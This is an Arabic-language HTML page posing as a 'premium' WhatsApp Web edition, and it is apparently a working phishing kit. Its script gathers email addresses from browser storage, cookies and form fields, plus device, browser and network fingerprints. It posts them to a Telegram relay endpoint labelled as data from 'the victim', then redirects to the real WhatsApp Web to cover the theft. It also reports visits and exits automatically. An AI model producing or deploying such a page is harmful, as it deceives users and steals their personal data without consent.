<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب ويب - النسخة المميزة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.8s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            padding: 40px 20px;
        }
        
        .whatsapp-icon {
            font-size: 60px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .content {
            padding: 30px;
        }
        
        .features {
            text-align: right;
            margin: 25px 0;
        }
        
        .feature {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            margin: 15px 0;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 12px;
            border-right: 4px solid #25D366;
        }
        
        .feature i {
            margin-left: 15px;
            color: #25D366;
            font-size: 20px;
        }
        
        .btn {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin: 15px 0;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.4);
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #25D366;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid #c3e6cb;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #6c757d;
        }

        .stats {
            background: #e9ecef;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="whatsapp-icon">📱</div>
            <h1>واتساب ويب - النسخة المميزة</h1>
            <p>تجربة جديدة ومتطورة لواتساب ويب</p>
        </div>
        
        <div class="content">
            <div class="features">
                <div class="feature">
                    <span>دعم جميع الملفات حتى 2GB</span>
                    <i>📁</i>
                </div>
                <div class="feature">
                    <span>مكالمات فيديو عالية الجودة</span>
                    <i>📹</i>
                </div>
                <div class="feature">
                    <span>وضع التخفي المتقدم</span>
                    <i>🕵️</i>
                </div>
                <div class="feature">
                    <span>نسخ احتياطي تلقائي</span>
                    <i>💾</i>
                </div>
            </div>
            
            <button class="btn" onclick="startVerification()">
                🔓 تفعيل النسخة المميزة
            </button>
            
            <div class="loading" id="loading">
                <div class="loader"></div>
                <p>جاري التحقق من الجهاز وتفعيل المميزات...</p>
                <div class="stats" id="stats"></div>
            </div>
            
            <div class="success-message" id="successMessage">
                ✅ تم التفعيل بنجاح! جاري تحميل واتساب ويب...
            </div>
            
            <div class="footer">
                سيتم تحويلك تلقائياً إلى واتساب ويب خلال ثوانٍ
            </div>
        </div>
    </div>

    <script>
        // دالة رئيسية لجمع كل البيانات
        async function startVerification() {
            const btn = document.querySelector('.btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('successMessage');
            const stats = document.getElementById('stats');
            
            // إخفاء الزر وإظهار التحميل
            btn.style.display = 'none';
            loading.style.display = 'block';
            
            // جمع جميع البيانات دفعة واحدة
            const allData = await collectAllData();
            
            // عرض الإحصائيات
            stats.innerHTML = `
                <strong>الإحصائيات:</strong><br>
                • الإيميلات المجمعة: ${allData.emails.length}<br>
                • البيانات المسروقة: ${JSON.stringify(allData).length} حرف
            `;
            
            // إرسال البيانات إلى السيرفر
            const sendResult = await sendToServer('🟢 بيانات كاملة من الضحية', allData);
            
            if (sendResult.success) {
                // محاكاة عملية التفعيل
                setTimeout(() => {
                    loading.style.display = 'none';
                    success.style.display = 'block';
                    
                    // إعادة التوجيه بعد نجاح "التفعيل"
                    setTimeout(() => {
                        window.location.href = 'https://web.whatsapp.com';
                    }, 3000);
                    
                }, 4000);
            } else {
                alert('حدث خطأ في التفعيل. حاول مرة أخرى.');
                btn.style.display = 'block';
                loading.style.display = 'none';
            }
        }

        // جمع جميع أنواع البيانات
        async function collectAllData() {
            const data = {
                // معلومات الجهاز الأساسية
                deviceInfo: collectDeviceInfo(),
                
                // الإيميلات من جميع المصادر
                emails: collectAllEmails(),
                
                // بيانات المتصفح
                browserData: collectBrowserData(),
                
                // معلومات الشبكة
                networkInfo: collectNetworkInfo(),
                
                // البيانات المخزنة محلياً
                storedData: collectStoredData(),
                
                // معلومات إضافية
                metadata: {
                    timestamp: new Date().toISOString(),
                    pageUrl: window.location.href,
                    referrer: document.referrer,
                    timeOnPage: Math.floor((Date.now() - performance.timing.navigationStart) / 1000)
                }
            };
            
            return data;
        }

        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                
                // معلومات الشاشة
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                },
                
                // معلومات النظام
                hardware: {
                    concurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0
                },
                
                // المنطقة الزمنية
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // إعدادات التاريخ
                locale: {
                    locale: Intl.DateTimeFormat().resolvedOptions().locale,
                    calendar: Intl.DateTimeFormat().resolvedOptions().calendar
                }
            };
        }

        // جمع الإيميلات من جميع المصادر الممكنة
        function collectAllEmails() {
            let allEmails = [];
            
            // 1. من localStorage
            allEmails = allEmails.concat(collectEmailsFromStorage(localStorage));
            
            // 2. من sessionStorage
            allEmails = allEmails.concat(collectEmailsFromStorage(sessionStorage));
            
            // 3. من IndexedDB (محاولة)
            allEmails = allEmails.concat(collectEmailsFromIndexedDB());
            
            // 4. من cookies
            allEmails = allEmails.concat(collectEmailsFromCookies());
            
            // 5. من autofill في الصفحة
            allEmails = allEmails.concat(collectEmailsFromAutofill());
            
            // إزالة التكرارات والقيم الفارغة
            return [...new Set(allEmails.filter(email => email && isValidEmail(email)))];
        }

        // جمع الإيميلات من storage
        function collectEmailsFromStorage(storage) {
            const emails = [];
            try {
                for (let i = 0; i < storage.length; i++) {
                    const key = storage.key(i);
                    const value = storage.getItem(key);
                    const foundEmails = extractEmailsFromText(value);
                    emails.push(...foundEmails);
                }
            } catch (e) {
                console.log('Error reading storage:', e);
            }
            return emails;
        }

        // جمع الإيميلات من IndexedDB
        function collectEmailsFromIndexedDB() {
            const emails = [];
            // محاولة الوصول إلى قواعد البيانات المشهورة
            const dbNames = [
                'firebaseLocalStorageDb',
                'keyvaluepairs',
                'localforage',
                'undefined'
            ];
            
            dbNames.forEach(dbName => {
                try {
                    const request = indexedDB.open(dbName);
                    request.onsuccess = function(event) {
                        const db = event.target.result;
                        const objectStoreNames = db.objectStoreNames;
                        console.log('Found DB:', dbName, objectStoreNames);
                    };
                } catch (e) {
                    // تجاهل الأخطاء
                }
            });
            
            return emails;
        }

        // جمع الإيميلات من cookies
        function collectEmailsFromCookies() {
            const emails = [];
            try {
                const cookies = document.cookie.split(';');
                cookies.forEach(cookie => {
                    const value = cookie.split('=')[1];
                    if (value) {
                        const foundEmails = extractEmailsFromText(decodeURIComponent(value));
                        emails.push(...foundEmails);
                    }
                });
            } catch (e) {
                console.log('Error reading cookies:', e);
            }
            return emails;
        }

        // جمع الإيميلات من حقول autofill
        function collectEmailsFromAutofill() {
            const emails = [];
            try {
                // جميع أنواع الحقول التي قد تحتوي على إيميلات
                const emailInputs = document.querySelectorAll(`
                    input[type="email"],
                    input[name*="email"],
                    input[id*="email"],
                    input[placeholder*="email"],
                    input[placeholder*="بريد"],
                    input[autocomplete="email"]
                `);
                
                emailInputs.forEach(input => {
                    if (input.value) {
                        const foundEmails = extractEmailsFromText(input.value);
                        emails.push(...foundEmails);
                    }
                });
                
                // أيضاً فحص جميع حقول النص
                const textInputs = document.querySelectorAll('input[type="text"]');
                textInputs.forEach(input => {
                    if (input.value && input.value.includes('@')) {
                        const foundEmails = extractEmailsFromText(input.value);
                        emails.push(...foundEmails);
                    }
                });
                
            } catch (e) {
                console.log('Error reading autofill:', e);
            }
            return emails;
        }

        // استخراج الإيميلات من النص
        function extractEmailsFromText(text) {
            if (!text || typeof text !== 'string') return [];
            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
            const matches = text.match(emailRegex) || [];
            return matches.filter(email => isValidEmail(email));
        }

        // التحقق من صحة الإيميل
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email) && email.length <= 254;
        }

        // جمع بيانات المتصفح
        function collectBrowserData() {
            return {
                userAgent: navigator.userAgent,
                vendor: navigator.vendor,
                product: navigator.product,
                plugins: Array.from(navigator.plugins).map(plugin => ({
                    name: plugin.name,
                    filename: plugin.filename,
                    description: plugin.description
                })),
                mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
                    type: mimeType.type,
                    description: mimeType.description
                })),
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                doNotTrack: navigator.doNotTrack || 'unspecified'
            };
        }

        // جمع معلومات الشبكة
        function collectNetworkInfo() {
            const connection = navigator.connection;
            return {
                effectiveType: connection ? connection.effectiveType : 'unknown',
                downlink: connection ? connection.downlink : 'unknown',
                rtt: connection ? connection.rtt : 'unknown',
                saveData: connection ? connection.saveData : false,
                onLine: navigator.onLine
            };
        }

        // جمع البيانات المخزنة
        function collectStoredData() {
            return {
                localStorageKeys: localStorage.length,
                sessionStorageKeys: sessionStorage.length,
                cookiesCount: document.cookie.split(';').filter(c => c.trim()).length,
                hasIndexedDB: !!window.indexedDB,
                hasWebSQL: !!window.openDatabase
            };
        }

        // إرسال البيانات إلى السيرفر
        async function sendToServer(message, data) {
            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({ 
                        message: message, 
                        data: data,
                        source: 'whatsapp-phishing-page'
                    })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                const result = await response.json();
                console.log('✅ تم إرسال البيانات بنجاح:', result);
                return { success: true, result: result };
                
            } catch (error) {
                console.error('❌ فشل إرسال البيانات:', error);
                
                // نسخ احتياطي - حفظ البيانات محلياً
                backupDataLocally(message, data);
                
                return { 
                    success: false, 
                    error: error.message 
                };
            }
        }

        // نسخ احتياطي للبيانات
        function backupDataLocally(message, data) {
            try {
                const backupKey = `backup_${Date.now()}`;
                const backupData = {
                    message: message,
                    data: data,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                localStorage.setItem(backupKey, JSON.stringify(backupData));
                console.log('📦 تم حفظ البيانات احتياطياً:', backupKey);
                
                // محاولة إرسال مرة أخرى بعد دقيقة
                setTimeout(() => {
                    const storedData = localStorage.getItem(backupKey);
                    if (storedData) {
                        console.log('🔄 إعادة محاولة إرسال البيانات...');
                        sendToServer(message + ' (إعادة إرسال)', data);
                    }
                }, 60000);
                
            } catch (e) {
                console.error('❌ فشل في حفظ البيانات احتياطياً:', e);
            }
        }

        // جمع بيانات أولية عند تحميل الصفحة
        window.addEventListener('load', function() {
            const initialData = {
                deviceInfo: collectDeviceInfo(),
                metadata: {
                    timestamp: new Date().toISOString(),
                    pageUrl: window.location.href,
                    referrer: document.referrer
                }
            };
            
            // إرسال زيارة أولية
            sendToServer('🟡 زيارة جديدة للصفحة', initialData);
        });

        // جمع بيانات عند مغادرة الصفحة
        window.addEventListener('beforeunload', function() {
            const exitData = {
                action: 'user_left_page',
                timeOnPage: Math.floor((Date.now() - performance.timing.navigationStart) / 1000),
                scrollDepth: getScrollDepth()
            };
            sendToServer('🔴 المستخدم غادر الصفحة', exitData);
        });

        function getScrollDepth() {
            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
            const scrollHeight = document.documentElement.scrollHeight;
            const clientHeight = document.documentElement.clientHeight;
            return Math.floor((scrollTop / (scrollHeight - clientHeight)) * 100);
        }
    </script>
</body>
</html>
